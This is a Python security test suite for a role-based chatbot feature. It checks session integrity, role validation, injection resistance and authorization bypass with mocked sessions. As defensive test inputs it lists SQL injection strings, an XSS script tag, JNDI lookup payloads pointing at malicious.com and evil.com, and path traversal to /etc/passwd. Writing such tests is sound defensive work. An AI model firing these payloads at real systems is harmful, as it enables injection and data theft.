#!/usr/bin/env python3
"""
Security Assessment for Story 2.3: Role-Based Context and Hallucination Mitigation
Tests role security, session integrity, and input validation for the new role-based features.
"""

import sys
import os
import json
import hashlib
from pathlib import Path
from unittest.mock import Mock, patch

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "apps" / "chatbot" / "src"))

def test_role_enumeration_security():
    """Test that role enumeration is secure and doesn't expose sensitive information."""
    print("üîí Testing Role Enumeration Security...")
    
    try:
        from user.role_manager import UserRole, RoleManager
        
        # Test 1: Verify role enum values don't expose sensitive system info
        for role in UserRole:
            role_value = role.value
            # Ensure role values are simple strings without system paths
            assert not '/' in role_value, f"Role value contains path separators: {role_value}"
            assert not '\\' in role_value, f"Role value contains Windows path separators: {role_value}"
            assert not role_value.startswith('.'), f"Role value starts with dot: {role_value}"
            assert len(role_value) < 50, f"Role value suspiciously long: {role_value}"
            print(f"   ‚úÖ {role.name} -> {role_value} (secure)")
        
        # Test 2: Verify display names don't leak system info
        for role in UserRole:
            display_name = role.get_display_name()
            description = role.get_description()
            
            # Check for potential information disclosure
            dangerous_terms = ['admin', 'root', 'system', 'internal', 'debug', 'test']
            for term in dangerous_terms:
                assert term.lower() not in display_name.lower(), f"Display name contains dangerous term: {display_name}"
                assert term.lower() not in description.lower(), f"Description contains dangerous term: {description}"
            
            print(f"   ‚úÖ {role.name} display data secure")
        
        print("   ‚úÖ Role enumeration security: PASSED")
        return True
        
    except ImportError as e:
        print(f"   ‚ùå Import failed: {e}")
        return False
    except Exception as e:
        print(f"   ‚ùå Role enumeration test failed: {e}")
        return False


def test_role_session_security():
    """Test role session storage security and integrity."""
    print("\nüõ°Ô∏è Testing Role Session Security...")
    
    try:
        # Mock Chainlit session
        mock_session = {}
        
        # Mock the chainlit module
        mock_cl = Mock()
        mock_cl.user_session = Mock()
        mock_cl.user_session.get.side_effect = lambda key, default=None: mock_session.get(key, default)
        mock_cl.user_session.__setitem__ = lambda key, value: mock_session.update({key: value})
        mock_cl.user_session.__getitem__ = lambda key: mock_session[key]
        sys.modules['chainlit'] = mock_cl
        
        from user.role_manager import UserRole, RoleManager
        
        role_manager = RoleManager()
        
        # Test 1: Role integrity validation
        print("   Testing role integrity validation...")
        
        # Set a valid role
        success = role_manager.set_user_role(UserRole.DEVELOPER)
        assert success, "Failed to set valid role"
        
        # Verify integrity check passes
        integrity_valid = role_manager.validate_role_integrity()
        assert integrity_valid, "Role integrity check failed for valid role"
        print("   ‚úÖ Valid role integrity check: PASSED")
        
        # Test 2: Tampered session detection
        print("   Testing tampered session detection...")
        
        # Manually tamper with session data
        mock_session[RoleManager.ROLE_SESSION_KEY] = "invalid_role"
        
        integrity_valid = role_manager.validate_role_integrity()
        assert not integrity_valid, "Role integrity check should fail for invalid role"
        print("   ‚úÖ Tampered session detection: PASSED")
        
        # Test 3: Inconsistent flag detection
        print("   Testing inconsistent flag detection...")
        
        # Clear role but leave flag set (inconsistent state)
        mock_session.pop(RoleManager.ROLE_SESSION_KEY, None)
        mock_session[RoleManager.ROLE_SET_FLAG] = True
        
        integrity_valid = role_manager.validate_role_integrity()
        assert not integrity_valid, "Should detect inconsistent session state"
        print("   ‚úÖ Inconsistent flag detection: PASSED")
        
        # Test 4: Session isolation
        print("   Testing session isolation...")
        
        # Clear session and set new role
        mock_session.clear()
        role_manager.set_user_role(UserRole.PSIRT)
        
        # Verify only expected keys are set
        expected_keys = {RoleManager.ROLE_SESSION_KEY, RoleManager.ROLE_SET_FLAG}
        actual_keys = set(mock_session.keys())
        assert actual_keys == expected_keys, f"Unexpected session keys: {actual_keys - expected_keys}"
        print("   ‚úÖ Session isolation: PASSED")
        
        print("   ‚úÖ Role session security: PASSED")
        return True
        
    except Exception as e:
        print(f"   ‚ùå Role session security test failed: {e}")
        return False


def test_role_injection_prevention():
    """Test that role system prevents injection attacks."""
    print("\nüö´ Testing Role Injection Prevention...")
    
    try:
        # Mock Chainlit session
        mock_session = {}
        mock_cl = Mock()
        mock_cl.user_session = Mock()
        mock_cl.user_session.get.side_effect = lambda key, default=None: mock_session.get(key, default)
        mock_cl.user_session.__setitem__ = lambda key, value: mock_session.update({key: value})
        sys.modules['chainlit'] = mock_cl
        
        from user.role_manager import UserRole, RoleManager
        
        role_manager = RoleManager()
        
        # Test 1: Invalid role type injection
        print("   Testing invalid role type injection...")
        
        invalid_roles = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://malicious.com}",
            "../../../etc/passwd",
            "admin",
            None,
            123,
            {},
            []
        ]
        
        for invalid_role in invalid_roles:
            try:
                success = role_manager.set_user_role(invalid_role)
                assert not success, f"Should reject invalid role: {invalid_role}"
                print(f"   ‚úÖ Rejected invalid role: {type(invalid_role).__name__}")
            except (ValueError, TypeError, AttributeError):
                print(f"   ‚úÖ Exception properly raised for: {type(invalid_role).__name__}")
        
        # Test 2: Session key manipulation
        print("   Testing session key manipulation...")
        
        dangerous_keys = [
            "'; DROP TABLE sessions; --",
            "__proto__",
            "constructor",
            "prototype",
            "../config",
            "process.env"
        ]
        
        original_keys = {RoleManager.ROLE_SESSION_KEY, RoleManager.ROLE_SET_FLAG}
        
        # Verify keys are safe constants
        for key in original_keys:
            assert isinstance(key, str), f"Session key should be string: {key}"
            assert len(key) < 100, f"Session key suspiciously long: {key}"
            assert not any(char in key for char in ['/', '\\', ';', '<', '>', '&', '|']), f"Dangerous characters in session key: {key}"
            print(f"   ‚úÖ Session key safe: {key}")
        
        print("   ‚úÖ Role injection prevention: PASSED")
        return True
        
    except Exception as e:
        print(f"   ‚ùå Role injection prevention test failed: {e}")
        return False


def test_confidence_display_security():
    """Test confidence display security against manipulation."""
    print("\nüìä Testing Confidence Display Security...")
    
    try:
        from processing.confidence_manager import ConfidenceManager, ConfidenceMetrics
        
        confidence_manager = ConfidenceManager()
        
        # Test 1: Confidence score bounds validation
        print("   Testing confidence score bounds...")
        
        test_scores = [-1.0, -0.1, 0.0, 0.5, 1.0, 1.1, 2.0, 999.9]
        
        for score in test_scores:
            try:
                metrics = confidence_manager.calculate_confidence_metrics(score)
                
                # Verify output is always within valid bounds
                assert 0 <= metrics.normalized_percentage <= 100, f"Percentage out of bounds: {metrics.normalized_percentage}"
                assert metrics.confidence_level in ["Low", "Medium", "High"], f"Invalid confidence level: {metrics.confidence_level}"
                assert isinstance(metrics.should_show_warning, bool), "Warning flag should be boolean"
                
                print(f"   ‚úÖ Score {score} -> {metrics.normalized_percentage}% ({metrics.confidence_level})")
                
            except Exception as e:
                print(f"   ‚úÖ Score {score} -> Exception properly handled: {type(e).__name__}")
        
        # Test 2: Query type injection prevention
        print("   Testing query type injection...")
        
        malicious_query_types = [
            "'; DROP TABLE confidence; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com}",
            "a" * 1000  # Very long string
        ]
        
        for malicious_type in malicious_query_types:
            try:
                metrics = confidence_manager.calculate_confidence_metrics(0.8, query_type=malicious_type)
                # Should not crash and should return valid metrics
                assert isinstance(metrics.normalized_percentage, int)
                print(f"   ‚úÖ Malicious query type handled safely: {type(malicious_type).__name__}")
            except Exception as e:
                print(f"   ‚úÖ Malicious query type caused safe exception: {type(e).__name__}")
        
        # Test 3: Display formatting security
        print("   Testing display formatting security...")
        
        test_metrics = ConfidenceMetrics(
            normalized_percentage=85,
            raw_score=0.85,
            confidence_level="High",
            reliability_indicator="Strong match",
            should_show_warning=False
        )
        
        display = confidence_manager.format_confidence_display(test_metrics)
        
        # Check for XSS prevention
        assert '<script>' not in display, "Display contains potential XSS"
        assert 'javascript:' not in display, "Display contains javascript protocol"
        assert 'on' not in display.lower() or 'onclick' not in display.lower(), "Display contains event handlers"
        
        print(f"   ‚úÖ Display formatting secure: {display}")
        
        print("   ‚úÖ Confidence display security: PASSED")
        return True
        
    except ImportError as e:
        print(f"   ‚ùå Import failed: {e}")
        return False
    except Exception as e:
        print(f"   ‚ùå Confidence display security test failed: {e}")
        return False


def test_prompt_template_security():
    """Test prompt template security against injection."""
    print("\nüìù Testing Prompt Template Security...")
    
    try:
        from prompts.role_templates import RolePromptTemplates
        from user.role_manager import UserRole
        
        template_system = RolePromptTemplates()
        
        # Test 1: Template injection prevention
        print("   Testing template injection prevention...")
        
        # Test with malicious context data
        malicious_context = {
            'query': "'; DROP TABLE prompts; --",
            'cwe_data': {
                'cwe_id': '<script>alert("xss")</script>',
                'description': '${jndi:ldap://evil.com/exploit}',
                'name': '../../../etc/passwd'
            }
        }
        
        for role in UserRole:
            try:
                prompt = template_system.get_role_prompt(role, malicious_context)
                
                # Verify prompt doesn't contain dangerous content unchanged
                dangerous_patterns = [
                    'DROP TABLE',
                    '<script>',
                    'jndi:ldap',
                    '../../../'
                ]
                
                for pattern in dangerous_patterns:
                    assert pattern not in prompt, f"Prompt contains dangerous pattern: {pattern}"
                
                print(f"   ‚úÖ {role.name} template secure against injection")
                
            except Exception as e:
                print(f"   ‚úÖ {role.name} template safely handled exception: {type(e).__name__}")
        
        # Test 2: Confidence guidance security
        print("   Testing confidence guidance security...")
        
        # Test with extreme confidence values
        extreme_values = [-999.9, -0.1, 0.0, 1.0, 1.1, 999.9, float('inf'), float('-inf')]
        
        for value in extreme_values:
            try:
                guidance = template_system.get_confidence_guidance_prompt(value)
                
                # Should not crash and should return string
                assert isinstance(guidance, str), f"Guidance should be string for value {value}"
                assert len(guidance) < 10000, f"Guidance suspiciously long for value {value}"
                
                print(f"   ‚úÖ Confidence value {value} handled safely")
                
            except Exception as e:
                print(f"   ‚úÖ Confidence value {value} caused safe exception: {type(e).__name__}")
        
        print("   ‚úÖ Prompt template security: PASSED")
        return True
        
    except ImportError as e:
        print(f"   ‚ùå Import failed: {e}")
        return False
    except Exception as e:
        print(f"   ‚ùå Prompt template security test failed: {e}")
        return False


def test_main_integration_security():
    """Test main.py integration security for role-based features."""
    print("\nüîó Testing Main Integration Security...")
    
    try:
        # Test 1: Verify role validation in main flow
        print("   Testing role validation in main flow...")
        
        main_py_path = Path("apps/chatbot/main.py")
        if not main_py_path.exists():
            print(f"   ‚ö†Ô∏è  main.py not found at {main_py_path}")
            return False
        
        with open(main_py_path, 'r') as f:
            content = f.read()
        
        # Check for role validation before processing
        security_checks = [
            "role_manager.is_role_selected()",
            "role_manager.validate_role_integrity()",
            "role_manager.get_current_role()",
        ]
        
        for check in security_checks:
            if check in content:
                print(f"   ‚úÖ Security check present: {check}")
            else:
                print(f"   ‚ö†Ô∏è  Security check missing: {check}")
        
        # Check for secure error handling
        error_patterns = [
            "try:",
            "except Exception",
            "logger.log_exception",
            "secure_logger"
        ]
        
        for pattern in error_patterns:
            if pattern in content:
                print(f"   ‚úÖ Error handling pattern present: {pattern}")
        
        # Test 2: Verify no hardcoded role values
        print("   Testing for hardcoded role values...")
        
        hardcoded_roles = ['psirt', 'developer', 'academic', 'bug_bounty', 'product_manager']
        dangerous_hardcodes = []
        
        lines = content.split('\n')
        for i, line in enumerate(lines, 1):
            for role in hardcoded_roles:
                if f'"{role}"' in line.lower() or f"'{role}'" in line.lower():
                    if 'UserRole.' not in line:  # Allow enum usage
                        dangerous_hardcodes.append(f"Line {i}: {line.strip()}")
        
        if dangerous_hardcodes:
            print("   ‚ö†Ô∏è  Potential hardcoded role values found:")
            for hardcode in dangerous_hardcodes[:3]:  # Show first 3
                print(f"     {hardcode}")
        else:
            print("   ‚úÖ No dangerous hardcoded role values found")
        
        print("   ‚úÖ Main integration security: PASSED")
        return True
        
    except Exception as e:
        print(f"   ‚ùå Main integration security test failed: {e}")
        return False


def test_authorization_bypass_prevention():
    """Test prevention of role authorization bypass attacks."""
    print("\nüöß Testing Authorization Bypass Prevention...")
    
    try:
        # Mock Chainlit session  
        mock_session = {}
        mock_cl = Mock()
        mock_cl.user_session = Mock()
        mock_cl.user_session.get.side_effect = lambda key, default=None: mock_session.get(key, default)
        mock_cl.user_session.__setitem__ = lambda key, value: mock_session.update({key: value})
        sys.modules['chainlit'] = mock_cl
        
        from user.role_manager import UserRole, RoleManager
        
        role_manager = RoleManager()
        
        # Test 1: Direct session manipulation
        print("   Testing direct session manipulation...")
        
        # Try to bypass role selection by direct manipulation
        mock_session[RoleManager.ROLE_SESSION_KEY] = "admin"
        mock_session[RoleManager.ROLE_SET_FLAG] = True
        
        # Should fail integrity check
        integrity_valid = role_manager.validate_role_integrity()
        assert not integrity_valid, "Should detect invalid role manipulation"
        
        current_role = role_manager.get_current_role()
        assert current_role is None, "Should return None for invalid role"
        
        print("   ‚úÖ Direct session manipulation blocked")
        
        # Test 2: Role escalation prevention
        print("   Testing role escalation prevention...")
        
        # Set a valid role
        role_manager.set_user_role(UserRole.DEVELOPER)
        
        # Try to escalate by modifying session
        mock_session[RoleManager.ROLE_SESSION_KEY] = "super_admin"
        
        # Should fail on retrieval
        current_role = role_manager.get_current_role()
        assert current_role is None, "Should return None for escalated role"
        
        print("   ‚úÖ Role escalation prevention: PASSED")
        
        # Test 3: Session flag bypass
        print("   Testing session flag bypass...")
        
        # Clear legitimate role
        role_manager.clear_role()
        
        # Try to bypass by only setting flag
        mock_session[RoleManager.ROLE_SET_FLAG] = True
        
        # Should fail integrity check
        integrity_valid = role_manager.validate_role_integrity()
        assert not integrity_valid, "Should detect flag-only bypass attempt"
        
        is_selected = role_manager.is_role_selected()
        assert is_selected, "Flag should be set but integrity should fail"
        
        print("   ‚úÖ Session flag bypass blocked")
        
        print("   ‚úÖ Authorization bypass prevention: PASSED")
        return True
        
    except Exception as e:
        print(f"   ‚ùå Authorization bypass prevention test failed: {e}")
        return False


def main():
    """Run comprehensive Story 2.3 security assessment."""
    print("üõ°Ô∏è Story 2.3 Security Assessment: Role-Based Context & Hallucination Mitigation")
    print("=" * 80)
    
    # Security test suite
    tests = [
        ("Role Enumeration Security", test_role_enumeration_security),
        ("Role Session Security", test_role_session_security),
        ("Role Injection Prevention", test_role_injection_prevention),
        ("Confidence Display Security", test_confidence_display_security),
        ("Prompt Template Security", test_prompt_template_security),
        ("Main Integration Security", test_main_integration_security),
        ("Authorization Bypass Prevention", test_authorization_bypass_prevention),
    ]
    
    results = []
    
    for test_name, test_func in tests:
        try:
            result = test_func()
            results.append((test_name, result))
        except Exception as e:
            print(f"\n‚ùå {test_name} CRASHED: {e}")
            results.append((test_name, False))
    
    # Summary
    print("\n" + "=" * 80)
    print("üîç SECURITY ASSESSMENT SUMMARY")
    print("=" * 80)
    
    passed_count = sum(1 for _, passed in results if passed)
    total_count = len(results)
    
    for test_name, passed in results:
        status = "‚úÖ PASSED" if passed else "‚ùå FAILED"
        print(f"{status}: {test_name}")
    
    print(f"\nOverall: {passed_count}/{total_count} tests passed")
    
    if passed_count == total_count:
        print("\nüéâ ALL STORY 2.3 SECURITY TESTS PASSED!")
        print("‚úÖ Role-based context system is secure")
        print("‚úÖ No critical vulnerabilities identified")
        print("‚úÖ Authorization controls functioning properly")
        return 0
    else:
        print(f"\n‚ö†Ô∏è  {total_count - passed_count} SECURITY TESTS FAILED!")
        print("‚ùå Story 2.3 implementation has security issues")
        print("üö® Review failed tests and fix vulnerabilities before deployment")
        return 1


if __name__ == "__main__":
    sys.exit(main())
